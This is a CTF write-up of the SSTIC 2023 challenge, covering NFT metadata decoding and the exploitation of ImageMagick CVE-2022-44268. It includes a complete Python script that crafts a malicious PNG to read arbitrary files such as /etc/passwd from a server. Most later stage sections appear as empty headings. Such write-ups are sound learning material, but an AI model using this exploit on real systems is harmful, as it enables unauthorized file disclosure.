Author: Robert Xiao (@nneonneo)

[__TOC__]

## Introduction

Another year, another [SSTIC challenge](https://www.sstic.org/2023/challenge/)! It was great fun this year and I was introduced to a lot of new concepts in a short time. This year's challenge featured a more parallel structure, with two short intro challenges leading up to a set of four "key recovery" challenges that could be completed in any order, and culminating in a final blockchain-based reversing challenge. This year was particularly heavy on cryptography, but also featured a bit of web exploitation, quite a bit of reverse engineering, and binary exploitation. As usual, the goal was to recover an email address ending in `@sstic.org` and send an email to complete the challenge. Along the way, flags could be captured and (optionally) submitted to the website to publicly display progress.

My timeline of the stages runs as follows (all times in my timezone, GMT-7); a fuller accounting of time is given in the [Timeline](#timeline) section.

- Fri Mar 31, 10:01 am: Start the challenge.
- Fri Mar 31, 10:05 am: Complete stage 0.
- Fri Mar 31, 10:55 am: Complete stage 1.
- Fri Mar 31, 1:19 pm: Complete stage 2.a. (I retrieved the key at this time, but did not submit the flag until 3:43pm)
- Fri Mar 31, 3:40 pm: Complete stage 2.b.
- Sat Apr 1, 5:13 am: Complete stage 2.d.
- Sun Apr 2, 4:57 am: Finish solving stage 3, but still need stage 2.c key to progress.
- Sun Apr 2, 8:06 am: Complete stage 2.c.
- Sun Apr 2, 8:13 am: Complete stage 3.
- Sun Apr 2, 8:22 am: Send email to complete the challenge.

The challenge this year was highly parallel, unlike the linear setup from the two past years. Everything necessary to solve 2.a~2.d and 3 (essentially all remaining challenges) was made available after solving stage 1. The challenge was presented in French, as usual, but most of the challenge is language-agnostic, and English translations are provided in this writeup.

The release of the challenge included this announcement:

<pre>
Salud deoc’h!

Your new Trois Pains Zéro bakery has decided to innovate in order to avoid queues
and allow you to taste our flagship recipe: the famous quatre-quarts (pound cake).
From July 1, 2023, you will only need to acquire a Non-Fungible Token (NFT)
from our collection [on OpenSea](https://testnets.opensea.io/assets/goerli/0x43F99c5517928be62935A1d7714408fae90d1896/1), and present it in store to receive your precious cake.

The purchase page will soon be available for all our customers and we hope to see you soon
at the store.

Delightfully yours,

Your Trois Pains Zéro bakery
</pre>

> The challenge is to access the NFT purchasing interface on the bakery site before anyone else, and to prove it by contacting the pastry chef by email to an address of the form ^[a-z0-9]{32}@sstic.org.

## Tools Used

Here, I list all of the tools that I used throughout the challenge.

- Computer: 2019 MacBook Pro, macOS 12.6.3
- Text editor: BBEdit
- VMWare Fusion 11, with an Ubuntu 20.04 VM:
    - gdb 12.1
    - qemu-user
- [Ghidra 10.2.3](https://ghidra-sre.org/)
- Python 3.10
    - [pwntools](https://github.com/Gallopsled/pwntools)
    - [Z3](https://github.com/Z3Prover/z3)
    - various cryptography/blockchain libraries as provided by the challenges (starknet-py, ecpy, bip-utils, etc.)
- [thoth tools for Cairo](https://github.com/FuzzingLabs/thoth)
- [SageMath 9.0](https://www.sagemath.org/)

## Stage 0

The introduction announcement includes a link to an NFT [on OpenSea](https://testnets.opensea.io/assets/goerli/0x43F99c5517928be62935A1d7714408fae90d1896/1), which depicts a [cute dog wearing a lobster costume and pastry chef hat](chall/stage0/nft.png). Checking the contract [on Etherscan](https://goerli.etherscan.io/address/0x43f99c5517928be62935a1d7714408fae90d1896), we see two files, [ERC1155.sol](chall/stage0/ERC1155.sol) and [TroisPainsZeroJNF.sol](chall/stage0/TroisPainsZeroJNF.sol). In TroisPainsZeroJNF.sol, we see this:

```
    string constant BASE_URI =
        'data:application/json;base64,eyJuYW1lIjogIlRyb2lzIFBhaW5zIFplcm8iLAogICAgICAgICAgImRlc2NyaXB0aW9uIjogIkxvYnN0ZXJkb2cgcGFzdHJ5IGNoZWYuIiwKICAgICAgICAgICJpbWFnZSI6ICJodHRwczovL25mdC5xdWF0cmUtcXUuYXJ0L25mdC1saWJyYXJ5LnBocD9pZD0xMiIsCiAgICAgICAgICAiZXh0ZXJuYWxfdXJsIjogImh0dHBzOi8vbmZ0LnF1YXRyZS1xdS5hcnQvbmZ0LWxpYnJhcnkucGhwP2lkPTEyIn0K';
```

This base64 blob decodes to

```js
{"name": "Trois Pains Zero",
          "description": "Lobsterdog pastry chef.",
          "image": "https://nft.quatre-qu.art/nft-library.php?id=12",
          "external_url": "https://nft.quatre-qu.art/nft-library.php?id=12"}
```

Indeed, if we visit [the URL](https://nft.quatre-qu.art/nft-library.php?id=12), we get an SVG showing the lobster dog. Checking the other IDs, we find that [ID #1](https://nft.quatre-qu.art/nft-library.php?id=1) contains [a flag](chall/stage0/1.svg)! Stage 0 done.

## Stage 1

If we don't supply an `id` parameter, we get [this page](https://nft.quatre-qu.art/nft-library.php), which offers to resize images for creating an NFT gallery. If we upload a PNG picture, it will resize it; uploading any other kind of picture seemingly produces the error "Invalid image header". In the HTTP headers, we find the line `X-Powered-By: ImageMagick/7.1.0-51`.

Checking online, we find that this version of ImageMagick is vulnerable to [CVE-2022-44268](https://twitter.com/JFrogSecurity/status/1621158368839892993), which provides an arbitrary remote file leak when converting PNG files. [This blog post](https://www.metabaseq.com/imagemagick-zero-days/) provides a great overview of the bug and the code path in ImageMagick that triggers it. It's extremely easy to exploit: adding a `tEXt` chunk of type `profile` with a file path (e.g. `/etc/passwd`) as the content is sufficient; the converted image will contain a `zTXt` (compressed text) chunk containing the contents of the target file.

I started by simply submitting the PoC given in the blog post, which worked perfectly and dumped the contents of `/etc/passwd`. Then I wrote a simple script, [`dl_file.py`](files/stage1/dl_file.py) to construct PNG files and download arbitrary remote documents:

```python
import requests
import struct
import zlib
import sys
import io
import base64
import os

PNG_SIG = b"\x89PNG\r\n\x1a\n"

# from pypng
def write_chunk(outfile, tag, data=b''):
    data = bytes(data)
    outfile.write(struct.pack("!I", len(data)))
    outfile.write(tag)
    outfile.write(data)
    checksum = zlib.crc32(tag)
    checksum = zlib.crc32(data, checksum)
    checksum &= 0xffffffff
    outfile.write(struct.pack("!I", checksum))

def write_chunks(out, chunks):
    """Create a PNG file by writing out the chunks."""

    out.write(PNG_SIG)
    for chunk in chunks:
        write_chunk(out, *chunk)

def chunks(infile):
    sig = infile.read(8)
    assert sig == PNG_SIG
    while 1:
        chunk = infile.read(8)
        if not chunk:
            return
        length, type = struct.unpack("!I4s", chunk)
        data = infile.read(length)
        assert len(data) == length
        checksum = infile.read(4)
        assert len(checksum) == 4
        yield (type, data)

def make_cve_png(filename):
    chunks = [
        (b"IHDR", bytes.fromhex("00 00 00 01 00 00 00 01 01 00 00 00 00")),
        (b"IDAT", bytes.fromhex("08 D7 63 68 00 00 00 82 00 81")),
        (b"tEXt", b"profile\0" + filename.encode("utf8") + b"\0"),
        (b"IEND", b""),
    ]
    f = io.BytesIO()
    write_chunks(f, chunks)
    return f.getvalue()

filename = sys.argv[1]
png = make_cve_png(filename)
r = requests.post("https://nft.quatre-qu.art/nft-library.php", data=dict(filedata=base64.b64encode(png)))
r.raise_for_status()
for ctype, cdata in chunks(io.BytesIO(r.content)):
    if ctype == b"zTXt" and cdata.startswith(b"Raw profile type"):
        data = zlib.decompress(cdata.split(b"\0\0", 1)[1])
        clean_filename = os.path.abspath(os.path.join("/1/2/3", filename))
        os.makedirs("leak/" + os.path.dirname(clean_filename), exist_ok=True)
        with open("leak/" + clean_filename, "wb") as outf:
            outf.write(bytes.fromhex(data.split(None, 1)[1].decode()))
        break
    print(ctype, cdata)
else:
    print("Error: no zTXt found!")
```

Running this to download [`nft-library.php`](chall/stage1/nft-library.php) produced the full original script, which contained a useful header:

```
// SSTIC{8c44f9aa39f4f69d26b91ae2b49ed4d2d029c0999e691f3122a883b01ee19fae}
// Une sauvegarde de l'infrastructure est disponible dans les fichiers suivants
// /backup.tgz, /devices.tgz
//
```

That's the stage 1 flag! I then used `dl-file.py` again to download [`backup.tgz`](chall/backup.tgz) and [`devices.tgz`](chall/devices.tgz).

## Main Challenge

Unpacking `backup.tgz` and `devices.tgz` yields a whole bunch of new files, including [`backup/info.eml`](chall/backup/info.eml), which reads (translated):

```
Hi Bertrand,

As you know, we are setting up the infrastructure for the upcoming release of our NFT on https://trois-pains-zero.quatre-qu.art/.
We have chosen to protect our administration interface using 4 of 4 multi-signature encryption using different devices to store private keys.


As a reminder, you will find the necessary files in the backup:

- the script I used to participate in the multi-signature protocol: musig2_player.py. I've also included the signature log file we made last Thursday along with our 4 public keys.

- a digital wallet for which you have the password: seedlocker.py

- a physical device, available here device.quatre-qu.art:8080, I think Charly has the password. If you want to test on your own equipment you will find the UI update on the backup server with the libc used. We have set up limitations, one based on proof of work, we have also provided you with the solver script (pow_solver.py) and a password "fudmH/MGzgUM7Zx3k6xMuvThTXh+ULf1".
The password is not the one for the equipment but the one for the protection.

- For the last equipment, Daniel lost his pin code.
We tried to extract the information by attacking the secure memory with fault injections but without success 😒.
For information, secure memory takes a mask as an argument and uses the stored value XORed with the mask. The measurements we made during the experiment are stored in data.h5. It is too large for backup but you can retrieve it at this address: https://trois-pains-zero.quatre-qu.art/data_34718ec031bbb6e094075a0c7da32bc5056a57ff082c206e6b70fcc864df09e9.h5.
Maybe you know someone who could help us find the information?


Good luck!
```

The remaining files are as follows:

- [`backup/flags`](chall/backup/flags): Encrypted flag files and a decryption routine
- [`backup/server`](chall/backup/server): The source code for the server running at https://trois-pains-zero.quatre-qu.art/
- [`devices`](chall/devices): Device-specific files for each of the devices which store private keys.

Reading through the server code, we can see that it will require a multi-signature using all four keys to access the admin area, then it will require a coupon code in order to actually order an NFT. In fact, the code which validates the coupon is stored on a Starknet blockchain which we can freely interact with, meaning that everything we need to solve the remainder of the challenge is provided in this package.

Our goal, then, is to recover the four private keys (corresponding to stages 2.a through 2.d) to construct a signature to access the admin area, then construct a valid coupon by reverse-engineering the Starknet blockchain contract (Stage 3), and finally contact the pastry chef (which, according to the server code, will require solving some kind of CAPTCHA). Let's go!

## Stage 2.a
## Stage 2.b
## Stage 2.c
## Stage 2.d
## Stage 3
## Final Stage

## Solution Summary

This is a quick summary of the solution; for details, consult the relevant sections of the writeup.

1. [Stage 0](#stage-0)
    1. Examine the NFT contract and base-64 decode the `BASE_URI` to get https://nft.quatre-qu.art/nft-library.php?id=12.
    2. Change the ID in the URI to `id=1` and visit that to get a flag.
2. [Stage 1](#stage-1)
    1. The website uses an outdated version of ImageMagick to resize PNGs at https://nft.quatre-qu.art/nft-library.php. Exploit CVE-2022-44268 to exfiltrate the script (containing the flag), then exfiltrate the backup files.
3. [Stage 2a](#stage-2a)
4. [Stage 2b](#stage-2b)
5. [Stage 2c](#stage-2c)
6. [Stage 2d](#stage-2d)
7. [Stage 3](#stage-3)
8. [Final Stage](#final-stage)
    1. Reformat the "transmission" in `final_secret.txt` as a sequence of fixed-length lines
    2. Read the image formed in the resulting text file (without word wrapping) to obtain the email address.

## Timeline

Here's an approximate timeline of my solution process, reconstructed via web browsing history, terminal logs, file timestamps, and Git commits. All times are local (GMT-7).

### Friday March 31

## Conclusion

